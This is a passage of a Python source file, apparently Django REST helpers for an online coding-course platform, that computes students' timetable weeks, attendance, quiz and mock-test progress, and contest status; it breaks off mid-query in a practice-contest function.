from .models import *
from rest_framework.generics import ListAPIView
from rest_framework.viewsets import ModelViewSet
from rest_framework.serializers import ModelSerializer
from rest_framework.permissions import IsAuthenticated
from knox.auth import TokenAuthentication
from django_filters.rest_framework import DjangoFilterBackend
from rest_framework.pagination import PageNumberPagination
from courseManagement.models import *
from testsManagement.models import *
from freeCourseManagement.models import *
from rest_framework.response import Response
from rest_framework.views import APIView
from rest_framework import status
import random
import ast
from datetime import datetime ,timedelta
from django.db.models import Max
import time
import requests
import json
from rest_framework import serializers
from collections import defaultdict
from django.db.models import Q
from itertools import chain
from django.db.models import IntegerField
from django.db.models.functions import Cast
from django.conf import settings
from freeCourseManagement.helpers import notify_user

RAPID_API_KEY = settings.RAPID_API_KEY

#change1
# def find_next_number(sorted_list, c_num):
#     index_c_num = sorted_list.index(c_num)
#     if index_c_num < len(sorted_list) - 1:
#         return sorted_list[index_c_num + 1]
#     else:
#         return sorted_list[0] if sorted_list else None


def get_next_index(lst, number):  #30/01/2024
    if number in lst:
        current_index = lst.index(number)
        next_index = (current_index + 1) % len(lst)
        return lst[next_index]
    else:
        return None
    

def get_completed_days(timetable):
    current_datetime = datetime.now()
    completed_days = []
    for index, entry in enumerate(timetable):
        start_date = entry.get('start_date')
        start_time = entry.get('start_time')
        start_datetime = datetime.combine(start_date, start_time) if start_date and start_time else None

        if start_datetime and current_datetime >= start_datetime:
            completed_days.append(index + 1)
    return completed_days

# def current_batch(timetable):
#     max_date = None

#     for entry in timetable:
#         start_date = entry.get('start_date')
#         if start_date:
#             if max_date is None or start_date > max_date :
#                 max_date = start_date
#     max_date = max_date + timedelta(30)
#     current_date = datetime.now().date()
#     if max_date > current_date:
#         return True
#     else:
#         return False

def current_batch(timetable, rev_date=None):
    current_date = datetime.now().date()
    if rev_date is None:
        max_date = datetime.min.date() 

        for entry in timetable:
            start_date = entry.get('start_date')
            if start_date:
                if max_date == 0 or start_date > max_date:
                    max_date = start_date      
        max_date = max_date + timedelta(days=30)
        result = max_date > current_date
    else:
        result = rev_date > current_date
    return result    

def get_week_for_today(timetable):
    current_datetime = datetime.now()
    formatted_datetime = current_datetime.strftime("%Y-%m-%d-%H:%M:%S")
    week_conut = []
    for c in timetable:
        if f"{c['start_date']}-{c['start_time']}" < formatted_datetime :
            week_conut.append(int(c["week"]))     
    s_week_count = set(week_conut)
    n_week_count = list(s_week_count)
    if len(n_week_count) == 0:
        check_week = 0
    else:
        check_week = n_week_count[-1]
    if week_conut.count(check_week) == 3:
        c_week = check_week
    else:
        # c_week = check_week-1
        c_week = check_week
    return c_week


def compiler_question_all_practice(user_id,q_id,course_id):  #30/01/2024
    std_id = [i["id"] for i in Student.objects.filter(user_id=user_id).values("id")]
    if len(std_id) > 0 :
        std_id = std_id[0]
    else:
        std_id = ""
    check_ans = CompilerQuestionAtempt.objects.filter(student_id=std_id,question__practice_mock=False, question_id = int(q_id),question__course_id =course_id,status=True, button_clicked = 'Submit' ).values("id","question_id","student_id","code_response_status")
    if check_ans.exists():
        return True
    else:
        return False
    
def compiler_question_all_mock(user_id,q_id,course_id):  #30/01/2024
    std_id = [i["id"] for i in Student.objects.filter(user_id=user_id).values("id")]
    if len(std_id) > 0 :
        std_id = std_id[0]
    else:
        std_id = ""
    check_ans = CompilerQuestionAtempt.objects.filter(student_id=std_id,question__practice_mock=True, question_id = int(q_id),question__course_id =course_id,status=True, button_clicked = 'Submit' ).values("id","question_id","student_id","code_response_status")
    # print(check_ans)
    if check_ans.exists():
        return True
    else:
        return False
    

def compiler_question_approches_practice(q_id):
    queryset = list(CompilerQuestion.objects.filter(id = q_id, practice_mock=False,disable= False).values())
    approch_flg = []
    exam_pic_flg =[]
    all_data =[]
    if queryset[0]["check_exm_pic1"] == True:
        # example_pic1 = queryset[0]["example1_picture"]
        exam_1 ={
            "name":"Sample Eg1",
            "example_pic":CompilerQuestion.objects.filter(id = q_id, practice_mock=False,disable= False).first().example1_picture.url
        }
        exam_pic_flg.append(exam_1)
    else:
        None
    if queryset[0]["check_exm_pic2"] == True:
        # example_pic2 = queryset[0]["example2_picture"]
        exam_2 ={
            "name":"Sample Eg2",
            "example_pic":CompilerQuestion.objects.filter(id = q_id, practice_mock=False,disable= False).first().example2_picture.url
        }
        exam_pic_flg.append(exam_2)
    else:
        None
    if queryset[0]["check_exm_pic3"] == True:
        # example_pic3 = queryset[0]["example3_picture"]
        exam_3 ={
            "name":"Sample Eg3",
            "example_pic":CompilerQuestion.objects.filter(id = q_id, practice_mock=False,disable= False).first().example3_picture.url
        }
        exam_pic_flg.append(exam_3)
    else:
        None
    #main_dict appr1
    my_dict1 = {}
    #main_dict appr2
    my_dict2 = {}
    #main_dict appr3
    my_dict3 = {}

    # approach1_block
    if queryset[0]["approach1_block"] == True:
        my_dict1["id"] = 1
        my_dict1["approach_title"] = queryset[0]["approach1_title"]
        my_dict1["approach_intuition"] = queryset[0]["approach1_intuition"]
        my_dict1["approach_algorithm"] = queryset[0]["approach1_algo"]
        my_dict1["approach_complexity_analysis"] = queryset[0]["approach1_complexity_analysis"]
    # apporch pic:
    if queryset[0]["approach1_picture_implementation"] == True : 
        code_imgs = [{"pic": queryset[0]["approach1_pic1"]} if queryset[0]["check_pic1"] == True else None,
                {"pic": queryset[0]["approach1_pic2"]} if queryset[0]["check_pic2"] == True else None,
                {"pic": queryset[0]["approach1_pic3"]} if queryset[0]["check_pic3"] == True else None,
                {"pic": queryset[0]["approach1_pic4"]} if queryset[0]["check_pic4"] == True else None,
                {"pic": queryset[0]["approach1_pic5"]} if queryset[0]["check_pic5"] == True else None ]
        my_dict1["code_imgs"] = code_imgs
    else:
        my_dict1["code_imgs"] = []
    #apporch code text:
    if queryset[0]["approach1_code_implementation"] == True :
        code_text_data = [
            {
                "id":1,
                "language": "c++",
                "code": queryset[0]["approach1_cpp_code"]
            },
            {
                "id":2,
                "language": "java",
                "code": queryset[0]["approach1_java_code"]
            },
            {
                "id":3,
                "language": "python",
                "code": queryset[0]["approach1_python_code"]
            }
        ]
        
        my_dict1["code_text_data"] = code_text_data
    else:
        my_dict1["code_text_data"] = []
    approch_flg.append(my_dict1)
  
    # approach2_block
    if queryset[0]["approach2_block"] == True:
        my_dict2["id"] = 2
        my_dict2["approach_title"] = queryset[0]["approach2_title"]
        my_dict2["approach_intuition"] = queryset[0]["approach2_intuition"]
        my_dict2["approach_algorithm"] = queryset[0]["approach2_algo"]
        my_dict3["approach_complexity_analysis"] = queryset[0]["approach2_complexity_analysis"]
    # apporch pic:
        if queryset[0]["approach2_picture_implementation"] == True : 
            code_imgs = [{"pic": queryset[0]["approach2_pic1"]} if queryset[0]["check_pic1_approach2"] == True else None,
                    {"pic": queryset[0]["approach2_pic2"]} if queryset[0]["check_pic2_approach2"] == True else None,
                    {"pic": queryset[0]["approach2_pic3"]} if queryset[0]["check_pic3_approach2"] == True else None,
                    {"pic": queryset[0]["approach2_pic4"]} if queryset[0]["check_pic4_approach2"] == True else None,
                    {"pic": queryset[0]["approach2_pic5"]} if queryset[0]["check_pic5_approach2"] == True else None ]
            my_dict2["code_imgs"] = code_imgs
        else:
            my_dict2["code_imgs"] = []
        #apporch code text:
        if queryset[0]["approach2_code_implementation"] == True :
            code_text_data = [
                {
                    "id":1,
                    "language": "c++",
                    "code": queryset[0]["approach2_cpp_code"]
                },
                {
                    "id":2,
                    "language": "java",
                    "code": queryset[0]["approach2_java_code"]
                },
                {
                    "id":3,
                    "language": "python",
                    "code": queryset[0]["approach2_python_code"]
                }
            ]
            
            my_dict2["code_text_data"] = code_text_data
        else:
            my_dict2["code_text_data"] = []
        
        approch_flg.append(my_dict2)

    # approach3_block
    if queryset[0]["approach3_block"] == True:
        my_dict3["id"] = 3
        my_dict3["approach_title"] = queryset[0]["approach3_title"]
        my_dict3["approach_intuition"] = queryset[0]["approach3_intuition"]
        my_dict3["approach_algorithm"] = queryset[0]["approach3_algo"]
        my_dict3["approach_complexity_analysis"] = queryset[0]["approach3_complexity_analysis"]
        # apporch pic:
        if queryset[0]["approach3_picture_implementation"] == True : 
            code_imgs = [{"pic": queryset[0]["approach3_pic1"]} if queryset[0]["check_pic1_approach3"] == True else None,
                    {"pic": queryset[0]["approach3_pic2"]} if queryset[0]["check_pic2_approach3"] == True else None,
                    {"pic": queryset[0]["approach3_pic3"]} if queryset[0]["check_pic3_approach3"] == True else None,
                    {"pic": queryset[0]["approach3_pic4"]} if queryset[0]["check_pic4_approach3"] == True else None,
                    {"pic": queryset[0]["approach3_pic5"]} if queryset[0]["check_pic5_approach3"] == True else None ]
            my_dict3["code_imgs"] = code_imgs
        else:
            my_dict3["code_imgs"] = []
        #apporch code text:
        if queryset[0]["approach3_code_implementation"] == True :
            code_text_data = [
                {
                    "id":1,
                    "language": "c++",
                    "code": queryset[0]["approach3_cpp_code"]
                },
                {
                    "id":2,
                    "language": "java",
                    "code": queryset[0]["approach3_java_code"]
                },
                {
                    "id":3,
                    "language": "python",
                    "code": queryset[0]["approach3_python_code"]
                }
            ]
            
            my_dict3["code_text_data"] = code_text_data
        else:
            my_dict3["code_text_data"] = []
        approch_flg.append(my_dict3)
    all_data ={"approch_flg":approch_flg,"example_pics":exam_pic_flg}    
    return all_data

def compiler_question_approches_moock(q_id):
    queryset = list(CompilerQuestion.objects.filter(id = q_id, practice_mock=True,disable= False).values())
    approch_flg = []
    exam_pic_flg =[]
    all_data =[]
    if queryset[0]["check_exm_pic1"] == True:
        # example_pic1 = queryset[0]["example1_picture"]
        exam_1 ={
            "name":"Sample Eg1",
            "example_pic":CompilerQuestion.objects.filter(id = q_id, practice_mock=True,disable= False).first().example1_picture.url
        }
        exam_pic_flg.append(exam_1)
    else:
        None
    if queryset[0]["check_exm_pic2"] == True:
        # example_pic2 = queryset[0]["example2_picture"]
        exam_2 ={
            "name":"Sample Eg2",
            "example_pic":CompilerQuestion.objects.filter(id = q_id, practice_mock=True,disable= False).first().example2_picture.url
        }
        exam_pic_flg.append(exam_2)
    else:
        None
    if queryset[0]["check_exm_pic3"] == True:
        # example_pic3 = queryset[0]["example3_picture"]
        exam_3 ={
            "name":"Sample Eg3",
            "example_pic":CompilerQuestion.objects.filter(id = q_id, practice_mock=True,disable= False).first().example3_picture.url
        }
        exam_pic_flg.append(exam_3)
    else:
        None
    #main_dict appr1
    my_dict1 = {}
    #main_dict appr2
    my_dict2 = {}
    #main_dict appr3
    my_dict3 = {}

    # approach1_block
    if queryset[0]["approach1_block"] == True:
        my_dict1["id"] = 1
        my_dict1["approach_title"] = queryset[0]["approach1_title"]
        my_dict1["approach_intuition"] = queryset[0]["approach1_intuition"]
        my_dict1["approach_algorithm"] = queryset[0]["approach1_algo"]
        my_dict1["approach_complexity_analysis"] = queryset[0]["approach1_complexity_analysis"]
    # apporch pic:
    if queryset[0]["approach1_picture_implementation"] == True : 
        code_imgs = [{"pic": queryset[0]["approach1_pic1"]} if queryset[0]["check_pic1"] == True else None,
                {"pic": queryset[0]["approach1_pic2"]} if queryset[0]["check_pic2"] == True else None,
                {"pic": queryset[0]["approach1_pic3"]} if queryset[0]["check_pic3"] == True else None,
                {"pic": queryset[0]["approach1_pic4"]} if queryset[0]["check_pic4"] == True else None,
                {"pic": queryset[0]["approach1_pic5"]} if queryset[0]["check_pic5"] == True else None ]
        my_dict1["code_imgs"] = code_imgs
    else:
        my_dict1["code_imgs"] = []
    #apporch code text:
    if queryset[0]["approach1_code_implementation"] == True :
        code_text_data = [
            {
                "id":1,
                "language": "c++",
                "code": queryset[0]["approach1_cpp_code"]
            },
            {
                "id":2,
                "language": "java",
                "code": queryset[0]["approach1_java_code"]
            },
            {
                "id":3,
                "language": "python",
                "code": queryset[0]["approach1_python_code"]
            }
        ]
        
        my_dict1["code_text_data"] = code_text_data
    else:
        my_dict1["code_text_data"] = []
    approch_flg.append(my_dict1)
  
    # approach2_block
    if queryset[0]["approach2_block"] == True:
        my_dict2["id"] = 2
        my_dict2["approach_title"] = queryset[0]["approach2_title"]
        my_dict2["approach_intuition"] = queryset[0]["approach2_intuition"]
        my_dict2["approach_algorithm"] = queryset[0]["approach2_algo"]
        my_dict3["approach_complexity_analysis"] = queryset[0]["approach2_complexity_analysis"]
    # apporch pic:
        if queryset[0]["approach2_picture_implementation"] == True : 
            code_imgs = [{"p": queryset[0]["approach2_pic1"]} if queryset[0]["check_pic1_approach2"] == True else None,
                    {"p": queryset[0]["approach2_pic2"]} if queryset[0]["check_pic2_approach2"] == True else None,
                    {"p": queryset[0]["approach2_pic3"]} if queryset[0]["check_pic3_approach2"] == True else None,
                    {"p": queryset[0]["approach2_pic4"]} if queryset[0]["check_pic4_approach2"] == True else None,
                    {"p": queryset[0]["approach2_pic5"]} if queryset[0]["check_pic5_approach2"] == True else None ]
            my_dict2["code_imgs"] = code_imgs
        else:
            my_dict2["code_imgs"] = []
        #apporch code text:
        if queryset[0]["approach2_code_implementation"] == True :
            code_text_data = [
                {
                    "id":1,
                    "language": "c++",
                    "code": queryset[0]["approach2_cpp_code"]
                },
                {
                    "id":2,
                    "language": "java",
                    "code": queryset[0]["approach2_java_code"]
                },
                {
                    "id":3,
                    "language": "python",
                    "code": queryset[0]["approach2_python_code"]
                }
            ]
            
            my_dict2["code_text_data"] = code_text_data
        else:
            my_dict2["code_text_data"] = []
        
        approch_flg.append(my_dict2)

    # approach3_block
    if queryset[0]["approach3_block"] == True:
        my_dict3["id"] = 3
        my_dict3["approach_title"] = queryset[0]["approach3_title"]
        my_dict3["approach_intuition"] = queryset[0]["approach3_intuition"]
        my_dict3["approach_algorithm"] = queryset[0]["approach3_algo"]
        my_dict3["approach_complexity_analysis"] = queryset[0]["approach3_complexity_analysis"]
        # apporch pic:
        if queryset[0]["approach3_picture_implementation"] == True : 
            code_imgs = [{"pic": queryset[0]["approach3_pic1"]} if queryset[0]["check_pic1_approach3"] == True else None,
                    {"pic": queryset[0]["approach3_pic2"]} if queryset[0]["check_pic2_approach3"] == True else None,
                    {"pic": queryset[0]["approach3_pic3"]} if queryset[0]["check_pic3_approach3"] == True else None,
                    {"pic": queryset[0]["approach3_pic4"]} if queryset[0]["check_pic4_approach3"] == True else None,
                    {"pic": queryset[0]["approach3_pic5"]} if queryset[0]["check_pic5_approach3"] == True else None ]
            my_dict3["code_imgs"] = code_imgs
        else:
            my_dict3["code_imgs"] = []
        #apporch code text:
        if queryset[0]["approach3_code_implementation"] == True :
            code_text_data = [
                {
                    "id":1,
                    "language": "c++",
                    "code": queryset[0]["approach3_cpp_code"]
                },
                {
                    "id":2,
                    "language": "java",
                    "code": queryset[0]["approach3_java_code"]
                },
                {
                    "id":3,
                    "language": "python",
                    "code": queryset[0]["approach3_python_code"]
                }
            ]
            
            my_dict3["code_text_data"] = code_text_data
        else:
            my_dict3["code_text_data"] = []
        approch_flg.append(my_dict3)
    all_data ={"approch_flg":approch_flg,"example_pics":exam_pic_flg}    
    return all_data

#04/01/2024
def quiz_progress_bar(user_id):
    quiz_data = []
    course_info_list = []
    std_ids = [i["id"] for i in Student.objects.filter(user_id=user_id).values("id")]
    get_batches = BatchJoined.objects.filter(student_id__in=std_ids).values("batch_id", "batch__course_id")
    course_ids = list(set([i["batch__course_id"] for i in get_batches]))
    if not course_ids:
        return Response({"message": 0, "error": "No Course"}, status=status.HTTP_400_BAD_REQUEST)

    for course_id in course_ids:
        course_name = Course.objects.get(id=course_id).name
        batch_list = Batch.objects.filter(students__id=std_ids[0], course_id=course_id).values()

        if not batch_list:
            return Response({"message": 0, "error": f"No Batch for Course {course_name}"}, status=status.HTTP_400_BAD_REQUEST)

        batch = batch_list[0]["id"]
        time_table = list(TimeTable.objects.filter(batch_id=batch).values("start_date", "start_time", "week"))

        c_week = get_week_for_today(time_table)
        if c_week is None:
            c_week = 8

        total_score = 0
        attempted_weeks = []  
        if int(c_week) == 0:
            course_data = {
            "name": course_name,
            "message": 1,
            "start_date": batch_list[0]["start_date"],
            "end_date": batch_list[0]["end_date"],
            "avg_score": "",
            "rem_score": "",
            "running_week": 0,
            "attempted_weeks": 0,
            }
            course_info_list.append(course_data)
        else:
            for i in range(1, c_week + 1):
                this_week_max_score_list = list(
                    QuizAttempt.objects.filter(student_id__in=std_ids, quiz__course_id=course_id,
                                                quiz__week=str(i)).values_list("score", flat=True))
                week_lst = QuizAttempt.objects.filter(student_id__in=std_ids, quiz__course_id=course_id,
                                                    quiz__week=str(i)).values("quiz__week", "score")
                this_week_max_score = [int(score) for score in this_week_max_score_list]
                if len(this_week_max_score) == 0:
                    max_week_score = 0
                else:
                    max_week_score = max(this_week_max_score)
                total_score += int(max_week_score)
                attempted_weeks.append(i) if week_lst else None  
            avg_score = total_score / c_week
            course_data = {
                "name": course_name,
                "message": 1,
                "start_date": batch_list[0]["start_date"],
                "end_date": batch_list[0]["end_date"],
                "avg_score": avg_score,
                "rem_score": 100 - avg_score,
                "running_week": c_week,
                "attempted_weeks": len(attempted_weeks),
            }
            course_info_list.append(course_data)

    quiz_data = {"quiz_details": course_info_list}
    return quiz_data

def mock_progress_bar(user_id):
    mock_data =[]
    course_info_list=[]
    std_ids = [i["id"] for i in Student.objects.filter(user_id=user_id).values("id")]
    get_batches = BatchJoined.objects.filter(student_id__in=std_ids).values("batch_id", "batch__course_id")
    course_ids = list(set([i["batch__course_id"] for i in get_batches]))

    if not course_ids:
        return Response({"message": 0, "error": "No Course"}, status=status.HTTP_400_BAD_REQUEST)

    course_info_list = []

    for course_id in course_ids:
        course_name = Course.objects.get(id=course_id).name
        batch_list = Batch.objects.filter(students__id=std_ids[0], course_id=course_id).values()
        if not batch_list:
            return Response({"message": 0, "error": f"No Batch for Course {course_name}"}, status=status.HTTP_400_BAD_REQUEST)
        batch = batch_list[0]["id"]
        time_table = list(TimeTable.objects.filter(batch_id=batch).values("start_date", "start_time", "week"))
        c_week = get_week_for_today(time_table)
        if c_week is None:
            c_week = 8
        total_score = 0
        attempted_weeks=[]
        if int(c_week) == 0:
            course_data = {
            "name": course_name,
            "message": 1,
            "start_date": batch_list[0]["start_date"],
            "end_date": batch_list[0]["end_date"],
            "avg_score": "",
            "rem_score": "",
            "running_week": 0,
            "attempted_weeks": 0,
            }
            course_info_list.append(course_data)
        else:
            for i in range(1, c_week + 1):
                this_week_max_score = list(
                    CompilerQuestionAtempt.objects.filter(student_id=std_ids[0], question__practice_mock=True,
                                                            question__course_id=course_id, question__week=str(i)).values_list("score", flat=True))
                week_lst = list(
                    CompilerQuestionAtempt.objects.filter(student_id=std_ids[0], question__practice_mock=True,
                                                            question__course_id=course_id, question__week=str(i)).values_list("question__week","score"))
                if len(this_week_max_score) == 0:
                    max_week_score = 0
                else:
                    max_week_score = max(this_week_max_score)
                total_score += max_week_score
                attempted_weeks.append(i) if week_lst else None  
            avg_score = total_score / c_week

            course_data = {
                "name": course_name,
                "message": 1,
                "start_date": batch_list[0]["start_date"],
                "end_date": batch_list[0]["end_date"],
                "avg_score": avg_score,
                "rem_score": 100 - avg_score,
                "running_week": c_week,
                "attempted_weeks": len(attempted_weeks),
            }
            course_info_list.append(course_data)
    mock_data ={"mock_details":course_info_list}   
    return mock_data

def student_attend_progress_bar(user_id):
    attendance_data =[]
    std_id = [Student.objects.get(user_id=user_id).id]
    get_batch = BatchJoined.objects.filter(student_id__in=std_id).values("batch_id", "batch__course_id")
    course_ids = [i["batch__course_id"] for i in get_batch]
    get_batches = BatchJoined.objects.filter(student_id__in=std_id,batch__course_id__in = course_ids).values("batch_id", "batch__course__name", "batch__start_date", "batch__end_date")
    if get_batches.exists():  
        pass
    else:
        return Response({"course_info": "Course not found", "message": 0}, status=status.HTTP_200_OK)
    batch_details = []
    for batch_info in get_batches:
        batch_info = {
            "batch_id": batch_info["batch_id"],
            "course_name": batch_info["batch__course__name"],
            "start_date": batch_info["batch__start_date"],
            "end_date": batch_info["batch__end_date"],
        }
        batch_details.append(batch_info)

    # Initialize a dictionary to store course-wise attendance details
    course_attendance = defaultdict(lambda: {"total_cls_sum": 0, "completed_classes_sum": 0})
    batch_details_user = list(Batch.objects.filter(students__id__in=std_id, completed=False).values_list("id", flat=True))
    current_batch_list = []
    response_data = []
    for i in batch_details_user:
        time_table = TimeTable.objects.filter(batch_id=i).values("start_date", "start_time")
        # current_batch_ = current_batch(time_table)
        rev_date = Batch.objects.filter(id=i).first().revoke_date
        current_batch_ = current_batch(time_table, rev_date)
        if current_batch_:
            current_batch_list.append(i)
    if len(current_batch_list) == 0:  
        return Response({"status": "Batch not found"}, status=status.HTTP_400_BAD_REQUEST)
    else:
        for batch_info in batch_details:
            batch_id = batch_info["batch_id"]
            time_table = TimeTable.objects.filter(batch_id=batch_id).values("start_date", "start_time")
            total_cls = len(time_table)
            completed_classes = get_completed_days(list(time_table))

            course_name = batch_info["course_name"]
            start_date =  batch_info["start_date"]
            end_date = batch_info["end_date"]
            course_attendance[course_name]["total_cls_sum"] += total_cls
            course_attendance[course_name]["completed_classes_sum"] += len(completed_classes)
        
        for course_name, attendance_info in course_attendance.items():
            total_cls_sum = attendance_info["total_cls_sum"]
            completed_classes_sum = attendance_info["completed_classes_sum"]
            remaining_classes = total_cls_sum - completed_classes_sum
            cls_attend_percentage = (completed_classes_sum / total_cls_sum) * 100 if total_cls_sum > 0 else 0
            if remaining_classes!= 0:

                response_data.append({
                    "batch_id" : batch_id,
                    "course_name": course_name,
                    "start_date": start_date,
                    "end_date": end_date,
                    "total_class": total_cls_sum,
                    "num_of_completed_classes": completed_classes_sum,
                    "remaining_classes": remaining_classes,
                    "cls_percentage": f"{cls_attend_percentage:.2f}",
                    "status": "",
                })
            else:
                response_data.append({
                "batch_id" : batch_id,    
                "course_name": course_name,
                "start_date": start_date,
                "end_date": end_date,
                "total_class": total_cls_sum,
                "num_of_completed_classes": completed_classes_sum,
                "remaining_classes": remaining_classes,
                "cls_percentage": f"{cls_attend_percentage:.2f}",
                "status": "Classes completed !",
                })       
        attendance_data ={"attendance_details":response_data}    
        return attendance_data

#03/01/2024
def quiz_contest(user_id):
    quiz_data =[]
    std_ids = [i["id"] for i in Student.objects.filter(user_id=user_id).values("id")]
    get_batch = BatchJoined.objects.filter(student_id__in=std_ids).values("batch_id", "batch__course_id", "batch__course__name")
    course_ids = [i["batch__course_id"] for i in get_batch]
    course_name = [i["batch__course__name"] for i in get_batch]
    flg = []
    for course_id in course_ids:
        get_quiz = Quiz.objects.filter(course_id=course_id).values("id")
        get_quiz_id = [i["id"] for i in get_quiz]
        batch_ids = [i["batch_id"] for i in get_batch if i["batch__course_id"] == course_id]
        all_times = TimeTable.objects.filter(batch__course_id=course_id, batch_id__in=batch_ids).values("week", "start_date", "start_time", "batch__course__name", "topic").order_by("id")
        data = []
        week_conut = [i["week"] for i in all_times]
        week_ids = list(set(week_conut))
        previous_attempt = QuizAttempt.objects.filter(student_id__in=std_ids, quiz__course_id=course_id, quiz_id__in=get_quiz_id, quiz__week__in=str(week_ids)).values("id", "quiz__id", "questions__id", "quiz__week", "quiz__course__name", "score", "attempts")
        all_times_for_weeks = TimeTable.objects.filter(batch__course_id=course_id, batch_id__in=batch_ids, week=str(1)).values("week", "start_date", "start_time", "batch__course__name", "topic").order_by("id")
        quiz_contest_details = []

        if len(previous_attempt) != 0:
            latest_attempt = previous_attempt.order_by('-id').first()
            stud_attempt = latest_attempt["attempts"]
            max_score = latest_attempt["score"]
            course_nm = latest_attempt["quiz__course__name"]
            week_val = list(set(latest_attempt["quiz__week"]))
            get_time = QuestionTimer.objects.filter(exam_field="Quiz", week__in=str(week_val), course__name=course_nm).values("week_pass_percent", "max_num_of_attempts")

            # Extracting values directly if the list has only one dictionary
            db_max_number = get_time[0]["week_pass_percent"] if get_time else None
            db_max_attempt = get_time[0]["max_num_of_attempts"] if get_time else None
            all_times_for_week = TimeTable.objects.filter(batch__course_id=course_id, batch_id__in=batch_ids, week__in=str(week_val)).values("week", "start_date", "start_time", "batch__course__name", "topic").order_by("id")
            second_dict = all_times_for_week[2]
            first_quiz_info = {
                    "week_value" : second_dict['week'],
                    "start_date_value" : second_dict['start_date'],
                    "start_time_value" : second_dict['start_time'],
                    "course_name_value" : second_dict['batch__course__name'],
                    "topic_value"  : second_dict['topic']
                }
            quiz_contest_details.append(first_quiz_info)

            # Checking conditions
            if float(max_score) >= float(db_max_number) and stud_attempt == db_max_attempt:
                completion_msg = "your max attempts has been completed, please reach out to support team to unlock this"
                flg.append({"name": course_ids,"course_id":course_id,"type":"quiz contest","last_info": latest_attempt,
                            "status": "Retake", "condition": completion_msg, "contest_details": quiz_contest_details})
            elif float(max_score) < float(db_max_number) and stud_attempt == db_max_attempt:
                # Pass a message indicating that the course attempt is completed
                completion_msg = "your max attempts has been completed, please reach out to support team to unlock this"
                flg.append({"name": course_ids,"course_id":course_id,"type":"quiz contest", "last_info": latest_attempt,
                            "status": "Retake", "condition": completion_msg, "contest_details": quiz_contest_details})
            else:
                flg.append({"name": course_ids,"course_id":course_id,"type":"quiz contest", "last_info": latest_attempt,
                            "status": "Retake", "condition": "", "contest_details": quiz_contest_details})
        else:
            second_dict = all_times_for_weeks[2]
            first_quiz_info = {
                "week_value": second_dict['week'],
                "start_date_value": second_dict['start_date'],
                "start_time_value": second_dict['start_time'],
                "course_name_value": second_dict['batch__course__name'],
                "topic_value": second_dict['topic']
            }
            data.append(first_quiz_info)
            flg.append({"name": course_ids,"course_id":course_id,"type":"quiz contest", "status": "Start Now","last_info": "", "condition": "", "contest_details": data}) 
    quiz_data ={"quiz_test_details":flg}    
    return quiz_data    

def mock_contest(user_id):
    mock_data =[]
    std_ids = [i["id"] for i in Student.objects.filter(user_id=user_id).values("id")]
    get_batch = BatchJoined.objects.filter(student_id__in=std_ids).values("batch_id", "batch__course_id", "batch__course__name")
    course_ids = [i["batch__course_id"] for i in get_batch]
    course_name = [i["batch__course__name"] for i in get_batch]
    flg = []
    for course_id in course_ids:
        batch_ids = [i["batch_id"] for i in get_batch if i["batch__course_id"] == course_id]
        all_times = TimeTable.objects.filter(batch__course_id=course_id, batch_id__in=batch_ids).values("week", "start_date", "start_time", "batch__course__name", "topic").order_by("id")
        data = []
        week_conut = [i["week"] for i in all_times]
        week_ids = list(set(week_conut))
        previous_attempt = CompilerQuestionAtempt.objects.filter(question__course_id=course_id,question__practice_mock = True, student_id__in = std_ids , question__week__in = str(week_ids)).values("id","question__id","question__ques_title","question__week","question__course__name","attepmt_number","score" )
        all_times_for_weeks = TimeTable.objects.filter(batch__course_id=course_id, batch_id__in=batch_ids, week=str(1)).values("week", "start_date", "start_time", "batch__course__name", "topic").order_by("id")
        mock_contest_details = []
        if len(previous_attempt)!=0:
            latest_attempt = previous_attempt.last()
            stud_attempt = latest_attempt["attepmt_number"]
            max_score = latest_attempt["score"]
            course_nm = latest_attempt["question__course__name"]
            week_val = list(set(latest_attempt["question__week"]))
            get_time = QuestionTimer.objects.filter(exam_field="Mock",week__in=str(week_val), course__name=course_nm).values("week_pass_percent", "max_num_of_attempts")
            # Extracting values directly if the list has only one dictionary
            db_max_number = get_time[0]["week_pass_percent"] if get_time else None
            db_max_attempt = get_time[0]["max_num_of_attempts"] if get_time else None
            all_times_for_week = TimeTable.objects.filter(batch__course_id=course_id, batch_id__in=batch_ids, week__in=str(week_val)).values("week", "start_date", "start_time", "batch__course__name", "topic").order_by("id")
            second_dict = all_times_for_week[2]
            first_quiz_info = {
                    "week_value" : second_dict['week'],
                    "start_date_value" : second_dict['start_date'],
                    "start_time_value" : second_dict['start_time'],
                    "course_name_value" : second_dict['batch__course__name'],
                    "topic_value"  : second_dict['topic']
                }
            mock_contest_details.append(first_quiz_info)
            # Checking conditions
            if float(max_score) >= float(db_max_number) and stud_attempt == db_max_attempt:
                completion_msg = "your max attempts has been completed, please reach out to support team to unlock this"
                flg.append({"name": course_ids,"course_id":course_id,"type":"mock contest", "last_info": latest_attempt,
                            "status": "Retake", "condition": completion_msg, "contest_details": mock_contest_details}) 
            elif float(max_score) < float(db_max_number) and stud_attempt == db_max_attempt:
                # Pass a message indicating that the course attempt is completed
                completion_msg = "your max attempts has been completed, please reach out to support team to unlock this"
                flg.append({"name": course_ids,"course_id":course_id,"type":"mock contest", "last_info": latest_attempt,
                            "status": "Retake", "condition": completion_msg, "contest_details": mock_contest_details})
            else:
                flg.append({"name": course_ids,"course_id":course_id,"type":"mock contest", "last_info": latest_attempt,
                            "status": "Retake", "condition": "", "contest_details": mock_contest_details})
        else:
            second_dict = all_times_for_weeks[2]
            first_mock_info = {
                "week_value": second_dict['week'],
                "start_date_value": second_dict['start_date'],
                "start_time_value": second_dict['start_time'],
                "course_name_value": second_dict['batch__course__name'],
                "topic_value": second_dict['topic']
            }
            data.append(first_mock_info)
            flg.append({"name": course_ids,"course_id":course_id,"type":"mock contest",  "status": "Start Now","last_info":"","condition": "", "contest_details": data})
    mock_data ={"mock_test_details":flg}    
    return mock_data      

def practice_contest(user_id):

    std_ids = [i["id"] for i in Student.objects.filter(user_id=user_id).values("id")]
    get_batch = BatchJoined.objects.filter(student_id__in=std_ids).values("batch_id", "batch__course_id", "batch__course__name")
    course_ids = [i["batch__course_id"] for i in get_batch]
    course_name = [i["batch__course__name"] for i in get_batch]
    flg = []
    for course_id in course_ids:
        batch_ids = [i["batch_id"] for i in get_batch if i["batch__course_id"] == course_id]
        weeks_days = CompilerQuestion.objects.filter(course_id =course_id, practice_mock = False,disable= False).values("week" , "day")
        week_id = list(set(i["week"] for i in weeks_days))
        day_id = list(set(i["day"] for i in weeks_days))
        all_times_for_weeks = TimeTable.objects.filter(batch__course_id=course_id, batch_id__in=batch_ids, week=str(1)).values("week", "start_date", "start_time", "batch__course__name", "topic").order_by("id")
        practice_contest_details = []
        data = []
        
        pre_code_list = SavePracticeCode.objects.filter(
            question__practice_mock=False,
